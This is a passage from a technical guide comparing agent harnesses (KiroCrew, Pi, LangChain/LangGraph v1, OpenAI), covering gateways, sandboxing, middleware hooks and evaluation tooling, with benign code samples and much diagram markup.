<defs><marker id="wkirocrew-g" viewBox="0 0 10 10" refX="8.5" refY="5" markerWidth="6.5" markerHeight="6.5" orient="auto-start-reverse"><path d="M0,0 L10,5 L0,10 z" fill="#8a96a8"/></marker><marker id="wkirocrew-o" viewBox="0 0 10 10" refX="8.5" refY="5" markerWidth="6.5" markerHeight="6.5" orient="auto-start-reverse"><path d="M0,0 L10,5 L0,10 z" fill="#FF9900"/></marker><marker id="wkirocrew-b" viewBox="0 0 10 10" refX="8.5" refY="5" markerWidth="6.5" markerHeight="6.5" orient="auto-start-reverse"><path d="M0,0 L10,5 L0,10 z" fill="#0052CC"/></marker><marker id="wkirocrew-r" viewBox="0 0 10 10" refX="8.5" refY="5" markerWidth="6.5" markerHeight="6.5" orient="auto-start-reverse"><path d="M0,0 L10,5 L0,10 z" fill="#de350b"/></marker><marker id="wkirocrew-gr" viewBox="0 0 10 10" refX="8.5" refY="5" markerWidth="6.5" markerHeight="6.5" orient="auto-start-reverse"><path d="M0,0 L10,5 L0,10 z" fill="#1e7e34"/></marker><marker id="wkirocrew-d" viewBox="0 0 10 10" refX="8.5" refY="5" markerWidth="6.5" markerHeight="6.5" orient="auto-start-reverse"><path d="M0,0 L10,5 L0,10 z" fill="#232F3E"/></marker></defs>
<text x="135.0" y="12.0" font-size="8.5" fill="#6b7a90" text-anchor="middle" font-weight="700">HARNESS COVERAGE</text>
<path d="M116.7 52.8 A62 62 0 0 1 153.3 52.8 L143.3 85.3 A28 28 0 0 0 126.7 85.3 Z" fill="#0052CC" stroke="#ffffff" stroke-width="1.6"/>
<text x="135.0" y="41.5" font-size="9.5" fill="#44546f" text-anchor="middle" font-weight="normal">Tools</text>
<path d="M155.0 53.3 A62 62 0 0 1 184.6 74.9 L157.4 95.2 A28 28 0 0 0 144.0 85.5 Z" fill="#9dbcf0" stroke="#ffffff" stroke-width="1.6"/>
<text x="176.7" y="58.1" font-size="9.5" fill="#44546f" text-anchor="start" font-weight="normal">Context</text>
<path d="M185.7 76.3 A62 62 0 0 1 197.0 111.1 L163.0 111.6 A28 28 0 0 0 157.9 95.9 Z" fill="#9dbcf0" stroke="#ffffff" stroke-width="1.6"/>
<text x="202.5" y="93.6" font-size="9.5" fill="#44546f" text-anchor="start" font-weight="normal">Caching</text>
<path d="M197.0 112.9 A62 62 0 0 1 185.7 147.7 L157.9 128.1 A28 28 0 0 0 163.0 112.4 Z" fill="#0052CC" stroke="#ffffff" stroke-width="1.6"/>
<text x="202.5" y="137.4" font-size="9.5" fill="#44546f" text-anchor="start" font-weight="normal">Memory</text>
<path d="M184.6 149.1 A62 62 0 0 1 155.0 170.7 L144.0 138.5 A28 28 0 0 0 157.4 128.8 Z" fill="#0052CC" stroke="#ffffff" stroke-width="1.6"/>
<text x="176.7" y="172.9" font-size="9.5" fill="#44546f" text-anchor="start" font-weight="normal">Bounds</text>
<path d="M153.3 171.2 A62 62 0 0 1 116.7 171.2 L126.7 138.7 A28 28 0 0 0 143.3 138.7 Z" fill="#0052CC" stroke="#ffffff" stroke-width="1.6"/>
<text x="135.0" y="191.5" font-size="9.5" fill="#44546f" text-anchor="middle" font-weight="normal">Agents</text>
<path d="M115.0 170.7 A62 62 0 0 1 85.4 149.1 L112.6 128.8 A28 28 0 0 0 126.0 138.5 Z" fill="#0052CC" stroke="#ffffff" stroke-width="1.6"/>
<text x="93.3" y="172.9" font-size="9.5" fill="#44546f" text-anchor="end" font-weight="normal">Sandbox</text>
<path d="M84.3 147.7 A62 62 0 0 1 73.0 112.9 L107.0 112.4 A28 28 0 0 0 112.1 128.1 Z" fill="#9dbcf0" stroke="#ffffff" stroke-width="1.6"/>
<text x="67.5" y="137.4" font-size="9.5" fill="#44546f" text-anchor="end" font-weight="normal">Evals</text>
<path d="M73.0 111.1 A62 62 0 0 1 84.3 76.3 L112.1 95.9 A28 28 0 0 0 107.0 111.6 Z" fill="#9dbcf0" stroke="#ffffff" stroke-width="1.6"/>
<text x="67.5" y="93.6" font-size="9.5" fill="#44546f" text-anchor="end" font-weight="normal">Cost</text>
<path d="M85.4 74.9 A62 62 0 0 1 115.0 53.3 L126.0 85.5 A28 28 0 0 0 112.6 95.2 Z" fill="#0052CC" stroke="#ffffff" stroke-width="1.6"/>
<text x="93.3" y="58.1" font-size="9.5" fill="#44546f" text-anchor="end" font-weight="normal">Observe</text>
<circle cx="135.0" cy="112.0" r="25" fill="#0052CC"/>
<text x="135.0" y="111.0" font-size="8.5" fill="#ffffff" text-anchor="middle" font-weight="700">Core</text>
<text x="135.0" y="121.0" font-size="8.5" fill="#ffffff" text-anchor="middle" font-weight="700">loop</text>
<rect x="14.0" y="214.0" width="12.0" height="10.0" rx="2" fill="#0052CC" stroke="#0052CC" stroke-width="1"/>
<text x="30.0" y="223.0" font-size="8.5" fill="#44546f" text-anchor="start" font-weight="normal">built in</text>
<rect x="98.0" y="214.0" width="12.0" height="10.0" rx="2" fill="#9dbcf0" stroke="#9dbcf0" stroke-width="1"/>
<text x="114.0" y="223.0" font-size="8.5" fill="#44546f" text-anchor="start" font-weight="normal">partial</text>
<rect x="182.0" y="214.0" width="12.0" height="10.0" rx="2" fill="#ffffff" stroke="#8a96a8" stroke-width="1" stroke-dasharray="4 3"/>
<text x="198.0" y="223.0" font-size="8.5" fill="#44546f" text-anchor="start" font-weight="normal">yours to build</text>
</svg>
</div>
<div class="fig-arch">
<div class="diagram-stack">
<div class="layer"><div class="layer-title">Surfaces</div><span class="chip">desktop and IDE</span><span class="chip">CLI</span><span class="chip">API</span><span class="chip">cron and autonudge</span></div>
<div class="v-arrow">↓ every tool call</div>
<div class="layer aws"><div class="layer-title">Gateway</div><span class="chip">signed capability tokens per agent, tool, session</span><span class="chip">safe-tool allowlists</span><span class="chip">audit log</span></div>
<div class="v-arrow">↓</div>
<div class="grid-3">
<div class="layer primary"><div class="layer-title">Sessions</div>a Seatbelt profile per execution</div>
<div class="layer primary"><div class="layer-title">Conductors</div>goal ledger, pipeline fleet, accept_eval.py verdicts</div>
<div class="layer primary"><div class="layer-title">Local stores</div>SQLite memory, JSON agent specs, skills, steering</div>
</div>
</div>
</div>
</div>

The gateway is the central component. Every tool call flows through a local service that checks the call against signed capability tokens scoped per agent, per tool, and per session, and the call runs only if the token grants that specific action. This is what makes an agent such as `kirocrew-heartbeat` safe to run unattended, because a safe-tool allowlist is enforced in the gateway rather than in the prompt, so a drifting agent cannot invoke a write tool it was never granted. Configuration and audit logs live under `~/.kiro/crew/`, where you can inspect what the gateway believes. Compared against the sandbox designs in section 9, the gateway is an authorization boundary rather than an execution boundary, and both are necessary because they catch different failures.

The CLI is a thin loop over an agent specification. Agents are declared as JSON in `~/.kiro/agents/*.json` and invoke each other through a standard MCP dispatch tool, while tool permissions, memory writes, and subagent dispatch all live in the gateway and the shared SQLite stores. That is why adding a new agent is a JSON edit rather than a code change. The desktop surface is another client of the same substrate rather than a separate system, with skills in `.kiro/skills`, steering in `.kiro/steering`, and session state under `~/.kiro/sessions/`, so an action taken in the IDE lands in the same tables as one taken from the CLI or from an unattended cron job.

KiroCrew evaluates work items rather than models, and it keeps the judgment out of the model. The conductor agent's rule is that acceptance is the evaluator's verdict, never its own reading of a child session's transcript. The verdict comes from `accept_eval.py` in the `goal-conductor` skill. The script reads typed acceptance specs on stdin, with kinds such as `pr_checks`, `file`, and `human_approval`, and returns `pass`, `fail`, `pending`, `refused`, or `error` with evidence for each item. Its security invariant is that no model-authored argv reaches a subprocess, so a spec can name a check but never a command. Research campaigns follow the same pattern. When `brief.md` defines a Definition of Done, each cycle records `verification: {passed, detail}`, and the campaign completes when `passed` is true. The Auto-Improvement app applies the most statistical discipline. It calibrates a metric and proves it against a known win before a run starts. It then measures every candidate A/B or RED/GREEN and keeps a change only when the win clears the measured noise band. KiroCrew has no general dataset-and-grader runner for offline regression suites, so you bring that yourself.

The unifying property is that memory, permissions, and sandboxing are all local, inspectable, and file-backed, using SQLite databases you can query, JSON files you can edit, and macOS Seatbelt profiles constraining per-execution filesystem writes. No cloud state can fall out of sync, so an agent that wakes on a timer can trust the state it wrote the day before, and scheduled self-continuing loops work. Signed capability tokens, per-execution sandboxes, editable file-backed memory, and scheduled wakeups are what make a local-first agent usable.

## A.4 Pi

Pi from Earendil Works is a minimal, extensible agent for the terminal under MIT, and its stated goal is to let you adapt Pi to your workflow rather than the reverse. It is a monorepo of separable packages, which is its most distinctive property.

| Package           | What it is                                           |
| ----------------- | ---------------------------------------------------- |
| `pi-coding-agent` | The interactive CLI                                  |
| `pi-agent-core`   | Agent runtime with tool calling and state management |
| `pi-ai`           | Unified multi-provider model API                     |
| `pi-tui`          | Terminal UI library with differential rendering      |
| `pi-durable`      | Durable conversation, task, and document runtime     |
| `pi-telemetry`    | Vendor-neutral telemetry contracts and typed schemas |
| `chord`           | Application-composition runtime for services and RPC |

<div class="diagram fig-split">
<div class="figure-inline">
<svg viewBox="0 0 270 236" xmlns="http://www.w3.org/2000/svg" role="img">
<defs><marker id="wpi-g" viewBox="0 0 10 10" refX="8.5" refY="5" markerWidth="6.5" markerHeight="6.5" orient="auto-start-reverse"><path d="M0,0 L10,5 L0,10 z" fill="#8a96a8"/></marker><marker id="wpi-o" viewBox="0 0 10 10" refX="8.5" refY="5" markerWidth="6.5" markerHeight="6.5" orient="auto-start-reverse"><path d="M0,0 L10,5 L0,10 z" fill="#FF9900"/></marker><marker id="wpi-b" viewBox="0 0 10 10" refX="8.5" refY="5" markerWidth="6.5" markerHeight="6.5" orient="auto-start-reverse"><path d="M0,0 L10,5 L0,10 z" fill="#0052CC"/></marker><marker id="wpi-r" viewBox="0 0 10 10" refX="8.5" refY="5" markerWidth="6.5" markerHeight="6.5" orient="auto-start-reverse"><path d="M0,0 L10,5 L0,10 z" fill="#de350b"/></marker><marker id="wpi-gr" viewBox="0 0 10 10" refX="8.5" refY="5" markerWidth="6.5" markerHeight="6.5" orient="auto-start-reverse"><path d="M0,0 L10,5 L0,10 z" fill="#1e7e34"/></marker><marker id="wpi-d" viewBox="0 0 10 10" refX="8.5" refY="5" markerWidth="6.5" markerHeight="6.5" orient="auto-start-reverse"><path d="M0,0 L10,5 L0,10 z" fill="#232F3E"/></marker></defs>
<text x="135.0" y="12.0" font-size="8.5" fill="#6b7a90" text-anchor="middle" font-weight="700">HARNESS COVERAGE</text>
<path d="M116.7 52.8 A62 62 0 0 1 153.3 52.8 L143.3 85.3 A28 28 0 0 0 126.7 85.3 Z" fill="#0052CC" stroke="#ffffff" stroke-width="1.6"/>
<text x="135.0" y="41.5" font-size="9.5" fill="#44546f" text-anchor="middle" font-weight="normal">Tools</text>
<path d="M155.0 53.3 A62 62 0 0 1 184.6 74.9 L157.4 95.2 A28 28 0 0 0 144.0 85.5 Z" fill="#0052CC" stroke="#ffffff" stroke-width="1.6"/>
<text x="176.7" y="58.1" font-size="9.5" fill="#44546f" text-anchor="start" font-weight="normal">Context</text>
<path d="M185.7 76.3 A62 62 0 0 1 197.0 111.1 L163.0 111.6 A28 28 0 0 0 157.9 95.9 Z" fill="#0052CC" stroke="#ffffff" stroke-width="1.6"/>
<text x="202.5" y="93.6" font-size="9.5" fill="#44546f" text-anchor="start" font-weight="normal">Caching</text>
<path d="M197.0 112.9 A62 62 0 0 1 185.7 147.7 L157.9 128.1 A28 28 0 0 0 163.0 112.4 Z" fill="#0052CC" stroke="#ffffff" stroke-width="1.6"/>
<text x="202.5" y="137.4" font-size="9.5" fill="#44546f" text-anchor="start" font-weight="normal">Memory</text>
<path d="M184.6 149.1 A62 62 0 0 1 155.0 170.7 L144.0 138.5 A28 28 0 0 0 157.4 128.8 Z" fill="#ffffff" stroke="#8a96a8" stroke-width="1.6" stroke-dasharray="3 2"/>
<text x="176.7" y="172.9" font-size="9.5" fill="#44546f" text-anchor="start" font-weight="normal">Bounds</text>
<path d="M153.3 171.2 A62 62 0 0 1 116.7 171.2 L126.7 138.7 A28 28 0 0 0 143.3 138.7 Z" fill="#9dbcf0" stroke="#ffffff" stroke-width="1.6"/>
<text x="135.0" y="191.5" font-size="9.5" fill="#44546f" text-anchor="middle" font-weight="normal">Agents</text>
<path d="M115.0 170.7 A62 62 0 0 1 85.4 149.1 L112.6 128.8 A28 28 0 0 0 126.0 138.5 Z" fill="#ffffff" stroke="#8a96a8" stroke-width="1.6" stroke-dasharray="3 2"/>
<text x="93.3" y="172.9" font-size="9.5" fill="#44546f" text-anchor="end" font-weight="normal">Sandbox</text>
<path d="M84.3 147.7 A62 62 0 0 1 73.0 112.9 L107.0 112.4 A28 28 0 0 0 112.1 128.1 Z" fill="#9dbcf0" stroke="#ffffff" stroke-width="1.6"/>
<text x="67.5" y="137.4" font-size="9.5" fill="#44546f" text-anchor="end" font-weight="normal">Evals</text>
<path d="M73.0 111.1 A62 62 0 0 1 84.3 76.3 L112.1 95.9 A28 28 0 0 0 107.0 111.6 Z" fill="#9dbcf0" stroke="#ffffff" stroke-width="1.6"/>
<text x="67.5" y="93.6" font-size="9.5" fill="#44546f" text-anchor="end" font-weight="normal">Cost</text>
<path d="M85.4 74.9 A62 62 0 0 1 115.0 53.3 L126.0 85.5 A28 28 0 0 0 112.6 95.2 Z" fill="#9dbcf0" stroke="#ffffff" stroke-width="1.6"/>
<text x="93.3" y="58.1" font-size="9.5" fill="#44546f" text-anchor="end" font-weight="normal">Observe</text>
<circle cx="135.0" cy="112.0" r="25" fill="#0052CC"/>
<text x="135.0" y="111.0" font-size="8.5" fill="#ffffff" text-anchor="middle" font-weight="700">Core</text>
<text x="135.0" y="121.0" font-size="8.5" fill="#ffffff" text-anchor="middle" font-weight="700">loop</text>
<rect x="14.0" y="214.0" width="12.0" height="10.0" rx="2" fill="#0052CC" stroke="#0052CC" stroke-width="1"/>
<text x="30.0" y="223.0" font-size="8.5" fill="#44546f" text-anchor="start" font-weight="normal">built in</text>
<rect x="98.0" y="214.0" width="12.0" height="10.0" rx="2" fill="#9dbcf0" stroke="#9dbcf0" stroke-width="1"/>
<text x="114.0" y="223.0" font-size="8.5" fill="#44546f" text-anchor="start" font-weight="normal">partial</text>
<rect x="182.0" y="214.0" width="12.0" height="10.0" rx="2" fill="#ffffff" stroke="#8a96a8" stroke-width="1" stroke-dasharray="4 3"/>
<text x="198.0" y="223.0" font-size="8.5" fill="#44546f" text-anchor="start" font-weight="normal">yours to build</text>
</svg>
</div>
<div class="fig-arch">
<div class="diagram-stack">
<div class="layer"><div class="layer-title">Run modes</div><span class="chip">interactive TUI</span><span class="chip">print</span><span class="chip">JSON</span><span class="chip">RPC</span><span class="chip">TypeScript SDK</span></div>
<div class="v-arrow">↓</div>
<div class="layer primary"><div class="layer-title">pi-coding-agent</div><span class="chip">built-in tools</span><span class="chip">extensions</span><span class="chip">skills</span><span class="chip">prompt templates</span><span class="chip">themes</span></div>
<div class="v-arrow">↓</div>
<div class="grid-3">
<div class="layer aws"><div class="layer-title">pi-agent-core</div>loop, tools, state</div>
<div class="layer aws"><div class="layer-title">pi-ai</div>providers, caching, faux provider</div>
<div class="layer aws"><div class="layer-title">pi-tui</div>differential rendering</div>
</div>
<div class="grid-3">
<div class="layer"><div class="layer-title">pi-durable</div>conversations and tasks</div>
<div class="layer"><div class="layer-title">pi-telemetry</div>typed schemas</div>
<div class="layer"><div class="layer-title">packages/evals</div>vitest-evals, paired runs</div>
</div>
<div class="layer warn"><div class="layer-title">Containment is yours</div><span class="chip">Gondolin micro-VM</span><span class="chip">Docker</span><span class="chip">OpenShell</span></div>
</div>
</div>
</div>

Extend Pi with TypeScript extensions, skills, prompt templates, and themes, and drive it interactively, in print mode, in JSON mode, in RPC mode, or through the TypeScript SDK. It requires Node 22.19 or newer. Pi is explicit about its boundaries, shipping no permission system and documenting containerization patterns instead, which is the case section 9 describes.

Pi keeps its evals in the monorepo as `packages/evals`, built on `vitest-evals`, and the design encodes several of the disciplines from section 10. Host evals run with `npm run eval:host`. Documentation-lift evals run with `npm run eval:docs`, which executes each case in two fresh containers, one with Pi's documentation and one without, and `--runs-per-variant` sets the repetitions. The report pairs the two arms and computes lift. It withholds the headline pass rate when any pair lacks a score, treats missing telemetry as unavailable rather than zero, and flags saturated controls and flaky cases. Eval definitions and fixtures become unreadable once the harness drops to an unprivileged user, so the agent cannot read its own grader. Each case is an ordinary `describeEval` suite with a judge such as `StructuredOutputJudge`. Below the eval layer, `fauxProvider()` in `pi-ai` scripts model responses, including tool calls and thinking blocks, for deterministic tests with no network.

It has the best extension model of the seven and a modular package split, so you can take `pi-ai` or `pi-tui` on their own without the rest. Its supply-chain hardening is worth copying. The costs are that first-party packages are TypeScript only, there is no sandboxing out of the box, and the whole thing is coding-agent-shaped, so a non-coding agent fits less naturally. Pick it when you want a terminal coding agent you will extend heavily, or a clean multi-provider model API with no framework attached.

## A.5 LangChain and LangGraph v1

LangChain v1 and LangGraph v1 shipped as a pair, and the split between them is now clean. LangChain gives you a ready-made agent loop, and LangGraph gives you the graph runtime that loop executes on.

```python
from langchain.agents import create_agent

agent = create_agent(
    model="claude-sonnet-4-6",
    tools=[search_web, analyze_data, send_email],
    system_prompt="You are a helpful research assistant.",
)
```

<div class="diagram fig-split">
<div class="figure-inline">
<svg viewBox="0 0 270 236" xmlns="http://www.w3.org/2000/svg" role="img">
<defs><marker id="wlangchain-g" viewBox="0 0 10 10" refX="8.5" refY="5" markerWidth="6.5" markerHeight="6.5" orient="auto-start-reverse"><path d="M0,0 L10,5 L0,10 z" fill="#8a96a8"/></marker><marker id="wlangchain-o" viewBox="0 0 10 10" refX="8.5" refY="5" markerWidth="6.5" markerHeight="6.5" orient="auto-start-reverse"><path d="M0,0 L10,5 L0,10 z" fill="#FF9900"/></marker><marker id="wlangchain-b" viewBox="0 0 10 10" refX="8.5" refY="5" markerWidth="6.5" markerHeight="6.5" orient="auto-start-reverse"><path d="M0,0 L10,5 L0,10 z" fill="#0052CC"/></marker><marker id="wlangchain-r" viewBox="0 0 10 10" refX="8.5" refY="5" markerWidth="6.5" markerHeight="6.5" orient="auto-start-reverse"><path d="M0,0 L10,5 L0,10 z" fill="#de350b"/></marker><marker id="wlangchain-gr" viewBox="0 0 10 10" refX="8.5" refY="5" markerWidth="6.5" markerHeight="6.5" orient="auto-start-reverse"><path d="M0,0 L10,5 L0,10 z" fill="#1e7e34"/></marker><marker id="wlangchain-d" viewBox="0 0 10 10" refX="8.5" refY="5" markerWidth="6.5" markerHeight="6.5" orient="auto-start-reverse"><path d="M0,0 L10,5 L0,10 z" fill="#232F3E"/></marker></defs>
<text x="135.0" y="12.0" font-size="8.5" fill="#6b7a90" text-anchor="middle" font-weight="700">HARNESS COVERAGE</text>
<path d="M116.7 52.8 A62 62 0 0 1 153.3 52.8 L143.3 85.3 A28 28 0 0 0 126.7 85.3 Z" fill="#0052CC" stroke="#ffffff" stroke-width="1.6"/>
<text x="135.0" y="41.5" font-size="9.5" fill="#44546f" text-anchor="middle" font-weight="normal">Tools</text>
<path d="M155.0 53.3 A62 62 0 0 1 184.6 74.9 L157.4 95.2 A28 28 0 0 0 144.0 85.5 Z" fill="#0052CC" stroke="#ffffff" stroke-width="1.6"/>
<text x="176.7" y="58.1" font-size="9.5" fill="#44546f" text-anchor="start" font-weight="normal">Context</text>
<path d="M185.7 76.3 A62 62 0 0 1 197.0 111.1 L163.0 111.6 A28 28 0 0 0 157.9 95.9 Z" fill="#9dbcf0" stroke="#ffffff" stroke-width="1.6"/>
<text x="202.5" y="93.6" font-size="9.5" fill="#44546f" text-anchor="start" font-weight="normal">Caching</text>
<path d="M197.0 112.9 A62 62 0 0 1 185.7 147.7 L157.9 128.1 A28 28 0 0 0 163.0 112.4 Z" fill="#0052CC" stroke="#ffffff" stroke-width="1.6"/>
<text x="202.5" y="137.4" font-size="9.5" fill="#44546f" text-anchor="start" font-weight="normal">Memory</text>
<path d="M184.6 149.1 A62 62 0 0 1 155.0 170.7 L144.0 138.5 A28 28 0 0 0 157.4 128.8 Z" fill="#0052CC" stroke="#ffffff" stroke-width="1.6"/>
<text x="176.7" y="172.9" font-size="9.5" fill="#44546f" text-anchor="start" font-weight="normal">Bounds</text>
<path d="M153.3 171.2 A62 62 0 0 1 116.7 171.2 L126.7 138.7 A28 28 0 0 0 143.3 138.7 Z" fill="#0052CC" stroke="#ffffff" stroke-width="1.6"/>
<text x="135.0" y="191.5" font-size="9.5" fill="#44546f" text-anchor="middle" font-weight="normal">Agents</text>
<path d="M115.0 170.7 A62 62 0 0 1 85.4 149.1 L112.6 128.8 A28 28 0 0 0 126.0 138.5 Z" fill="#ffffff" stroke="#8a96a8" stroke-width="1.6" stroke-dasharray="3 2"/>
<text x="93.3" y="172.9" font-size="9.5" fill="#44546f" text-anchor="end" font-weight="normal">Sandbox</text>
<path d="M84.3 147.7 A62 62 0 0 1 73.0 112.9 L107.0 112.4 A28 28 0 0 0 112.1 128.1 Z" fill="#0052CC" stroke="#ffffff" stroke-width="1.6"/>
<text x="67.5" y="137.4" font-size="9.5" fill="#44546f" text-anchor="end" font-weight="normal">Evals</text>
<path d="M73.0 111.1 A62 62 0 0 1 84.3 76.3 L112.1 95.9 A28 28 0 0 0 107.0 111.6 Z" fill="#9dbcf0" stroke="#ffffff" stroke-width="1.6"/>
<text x="67.5" y="93.6" font-size="9.5" fill="#44546f" text-anchor="end" font-weight="normal">Cost</text>
<path d="M85.4 74.9 A62 62 0 0 1 115.0 53.3 L126.0 85.5 A28 28 0 0 0 112.6 95.2 Z" fill="#0052CC" stroke="#ffffff" stroke-width="1.6"/>
<text x="93.3" y="58.1" font-size="9.5" fill="#44546f" text-anchor="end" font-weight="normal">Observe</text>
<circle cx="135.0" cy="112.0" r="25" fill="#0052CC"/>
<text x="135.0" y="111.0" font-size="8.5" fill="#ffffff" text-anchor="middle" font-weight="700">Core</text>
<text x="135.0" y="121.0" font-size="8.5" fill="#ffffff" text-anchor="middle" font-weight="700">loop</text>
<rect x="14.0" y="214.0" width="12.0" height="10.0" rx="2" fill="#0052CC" stroke="#0052CC" stroke-width="1"/>
<text x="30.0" y="223.0" font-size="8.5" fill="#44546f" text-anchor="start" font-weight="normal">built in</text>
<rect x="98.0" y="214.0" width="12.0" height="10.0" rx="2" fill="#9dbcf0" stroke="#9dbcf0" stroke-width="1"/>
<text x="114.0" y="223.0" font-size="8.5" fill="#44546f" text-anchor="start" font-weight="normal">partial</text>
<rect x="182.0" y="214.0" width="12.0" height="10.0" rx="2" fill="#ffffff" stroke="#8a96a8" stroke-width="1" stroke-dasharray="4 3"/>
<text x="198.0" y="223.0" font-size="8.5" fill="#44546f" text-anchor="start" font-weight="normal">yours to build</text>
</svg>
</div>
<div class="fig-arch">
<div class="diagram-stack">
<div class="layer primary"><div class="layer-title">create_agent(model, tools, system_prompt)</div><span class="chip">langchain v1</span></div>
<div class="v-arrow">↓</div>
<div class="layer"><div class="layer-title">Middleware hooks, in call order</div><span class="chip">before_agent</span><span class="chip">before_model</span><span class="chip">wrap_model_call</span><span class="chip">wrap_tool_call</span><span class="chip">after_model</span><span class="chip">after_agent</span></div>
<div class="layer"><div class="layer-title">Prebuilt middleware</div><span class="chip">PIIMiddleware</span><span class="chip">SummarizationMiddleware</span><span class="chip">HumanInTheLoopMiddleware</span></div>
<div class="v-arrow">↓</div>
<div class="layer aws"><div class="layer-title">LangGraph runtime</div><span class="chip">checkpointing</span><span class="chip">streaming</span><span class="chip">interrupts</span><span class="chip">time travel</span><span class="chip">graphs and handoffs</span></div>
<div class="v-arrow">↓ traces</div>
<div class="layer success"><div class="layer-title">Evaluation</div><span class="chip">agentevals</span><span class="chip">openevals</span><span class="chip">LangSmith offline and online</span></div>
</div>
</div>
</div>

Middleware is the defining feature and the best-designed hook system of the seven, exposing `before_agent`, `before_model`, `wrap_model_call`, `wrap_tool_call`, `after_model`, and `after_agent`. Prebuilt middleware covers the common needs, with `PIIMiddleware` redacting or blocking sensitive information, `SummarizationMiddleware` condensing history on a token trigger, and `HumanInTheLoopMiddleware` requiring approval on named tools with approve, edit, or reject. Because `create_agent` is built on LangGraph you inherit persistence through checkpointing, streaming, human-in-the-loop pauses, and time travel without learning LangGraph itself.

Standard content blocks give provider-agnostic access to reasoning, citations, and built-in tools. Structured output now generates in the main loop instead of in an extra model call. The namespace shrank, with legacy chains, retrievers, and the indexing API moved to `langchain-classic`.

LangChain splits evals across two open-source packages and one platform. `agentevals` scores trajectories, meaning the ordered messages and tool calls of a run. Its `create_trajectory_match_evaluator` compares a run against a reference trajectory. The modes are `strict`, `unordered`, `subset` for no tools beyond the reference, and `superset` for at least the reference tools.

```python
from agentevals.trajectory.match import create_trajectory_match_evaluator

evaluator = create_trajectory_match_evaluator(trajectory_match_mode="superset")
result = agent.invoke({"messages": [HumanMessage(content="What is the weather in Boston?")]})
evaluation = evaluator(outputs=result["messages"], reference_outputs=reference_trajectory)
assert evaluation["score"] is True
```

The `tool_args_match_mode` setting controls how strictly arguments compare, and `create_trajectory_llm_as_judge` grades the path with a model and needs no reference. `openevals` supplies reference-free judges through `create_llm_as_judge`, and it simulates multi-turn conversations with `create_llm_simulated_user` and `run_multiturn_simulation`. LangSmith adds the lifecycle. Offline experiments run one application version against a dataset of examples with reference outputs, through `evaluate()` or a pytest suite marked `@pytest.mark.langsmith`. Online evaluators score production runs and multi-turn threads with no reference, with the sampling rate, filters, and spend limits set per project. Annotation queues route traces to human reviewers.

This is the largest ecosystem with the best hook design and real graph orchestration when you need it, and it is model-agnostic throughout. The costs are the largest surface area and the most history to navigate, a v0-to-v1 migration that is real work, and middleware flexible enough to hide complexity in six places at once. Pick it when you need explicit state, resumable runs, or human approval gates at named points.

## A.6 OpenAI: Responses, Agents SDK, and Codex

OpenAI offers three surfaces that solve different problems and compose. Know which surface owns which concern before you build, so that you do not rebuild what already ships.

<div class="diagram fig-split">
<div class="figure-inline">
<svg viewBox="0 0 270 236" xmlns="http://www.w3.org/2000/svg" role="img">
<defs><marker id="wopenai-g" viewBox="0 0 10 10" refX="8.5" refY="5" markerWidth="6.5" markerHeight="6.5" orient="auto-start-reverse"><path d="M0,0 L10,5 L0,10 z" fill="#8a96a8"/></marker><marker id="wopenai-o" viewBox="0 0 10 10" refX="8.5" refY="5" markerWidth="6.5" markerHeight="6.5" orient="auto-start-reverse"><path d="M0,0 L10,5 L0,10 z" fill="#FF9900"/></marker><marker id="wopenai-b" viewBox="0 0 10 10" refX="8.5" refY="5" markerWidth="6.5" markerHeight="6.5" orient="auto-start-reverse"><path d="M0,0 L10,5 L0,10 z" fill="#0052CC"/></marker><marker id="wopenai-r" viewBox="0 0 10 10" refX="8.5" refY="5" markerWidth="6.5" markerHeight="6.5" orient="auto-start-reverse"><path d="M0,0 L10,5 L0,10 z" fill="#de350b"/></marker><marker id="wopenai-gr" viewBox="0 0 10 10" refX="8.5" refY="5" markerWidth="6.5" markerHeight="6.5" orient="auto-start-reverse"><path d="M0,0 L10,5 L0,10 z" fill="#1e7e34"/></marker><marker id="wopenai-d" viewBox="0 0 10 10" refX="8.5" refY="5" markerWidth="6.5" markerHeight="6.5" orient="auto-start-reverse"><path d="M0,0 L10,5 L0,10 z" fill="#232F3E"/></marker></defs>
<text x="135.0" y="12.0" font-size="8.5" fill="#6b7a90" text-anchor="middle" font-weight="700">HARNESS COVERAGE</text>
<path d="M116.7 52.8 A62 62 0 0 1 153.3 52.8 L143.3 85.3 A28 28 0 0 0 126.7 85.3 Z" fill="#0052CC" stroke="#ffffff" stroke-width="1.6"/>
<text x="135.0" y="41.5" font-size="9.5" fill="#44546f" text-anchor="middle" font-weight="normal">Tools</text>
<path d="M155.0 53.3 A62 62 0 0 1 184.6 74.9 L157.4 95.2 A28 28 0 0 0 144.0 85.5 Z" fill="#0052CC" stroke="#ffffff" stroke-width="1.6"/>
<text x="176.7" y="58.1" font-size="9.5" fill="#44546f" text-anchor="start" font-weight="normal">Context</text>
<path d="M185.7 76.3 A62 62 0 0 1 197.0 111.1 L163.0 111.6 A28 28 0 0 0 157.9 95.9 Z" fill="#0052CC" stroke="#ffffff" stroke-width="1.6"/>
<text x="202.5" y="93.6" font-size="9.5" fill="#44546f" text-anchor="start" font-weight="normal">Caching</text>
<path d="M197.0 112.9 A62 62 0 0 1 185.7 147.7 L157.9 128.1 A28 28 0 0 0 163.0 112.4 Z" fill="#9dbcf0" stroke="#ffffff" stroke-width="1.6"/>
<text x="202.5" y="137.4" font-size="9.5" fill="#44546f" text-anchor="start" font-weight="normal">Memory</text>
<path d="M184.6 149.1 A62 62 0 0 1 155.0 170.7 L144.0 138.5 A28 28 0 0 0 157.4 128.8 Z" fill="#0052CC" stroke="#ffffff" stroke-width="1.6"/>
<text x="176.7" y="172.9" font-size="9.5" fill="#44546f" text-anchor="start" font-weight="normal">Bounds</text>
<path d="M153.3 171.2 A62 62 0 0 1 116.7 171.2 L126.7 138.7 A28 28 0 0 0 143.3 138.7 Z" fill="#0052CC" stroke="#ffffff" stroke-width="1.6"/>
<text x="135.0" y="191.5" font-size="9.5" fill="#44546f" text-anchor="middle" font-weight="normal">Agents</text>
<path d="M115.0 170.7 A62 62 0 0 1 85.4 149.1 L112.6 128.8 A28 28 0 0 0 126.0 138.5 Z" fill="#0052CC" stroke="#ffffff" stroke-width="1.6"/>
<text x="93.3" y="172.9" font-size="9.5" fill="#44546f" text-anchor="end" font-weight="normal">Sandbox</text>
<path d="M84.3 147.7 A62 62 0 0 1 73.0 112.9 L107.0 112.4 A28 28 0 0 0 112.1 128.1 Z" fill="#9dbcf0" stroke="#ffffff" stroke-width="1.6"/>
<text x="67.5" y="137.4" font-size="9.5" fill="#44546f" text-anchor="end" font-weight="normal">Evals</text>
